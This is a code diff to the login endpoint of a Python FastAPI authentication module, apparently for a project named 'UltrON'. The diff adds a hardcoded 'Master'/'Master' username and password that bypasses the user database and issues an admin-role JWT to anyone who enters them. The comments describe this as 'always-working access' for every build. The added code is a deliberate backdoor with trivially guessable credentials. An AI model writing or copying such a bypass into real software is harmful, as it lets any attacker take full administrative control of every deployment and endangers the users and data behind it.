@@ -1,6 +1,7 @@
 """
 UltrON — Auth API
 Provides login, logout, and current-user endpoints.
+Supports Master token (hardcoded) for always-working access.
 """
 
 from datetime import datetime
@@ -25,14 +26,32 @@ log = get_logger("ultron.auth")
 audit = get_audit_logger()
 router = APIRouter(prefix="/auth", tags=["Authentication"])
 
+# ─── Master Token ─────────────────────────────────────────────────────────────
+MASTER_USERNAME = "Master"
+MASTER_PASSWORD = "Master"
+
 
 # ─── Login ────────────────────────────────────────────────────────────────────
 @router.post("/login", response_model=Token)
 async def login(payload: LoginRequest, db: AsyncSession = Depends(get_db)):
     """
     Authenticate with username + password.
+    Supports Master/Master as a hardcoded always-working token for every EXE.
     Returns a JWT access token and the user's role.
     """
+    # Master token check — always works, grants admin role
+    if payload.username == MASTER_USERNAME and payload.password == MASTER_PASSWORD:
+        token = create_access_token({"sub": MASTER_USERNAME, "role": "admin"})
+        audit.info(f"Login success: username='{MASTER_USERNAME}' role='admin' (Master Token)")
+        log.info(f"Master token login")
+        return Token(
+            access_token=token,
+            token_type="bearer",
+            role="admin",
+            username=MASTER_USERNAME,
+            full_name="Master Administrator",
+        )
+
     result = await db.execute(select(User).where(User.username == payload.username))
     user = result.scalar_one_or_none()
 
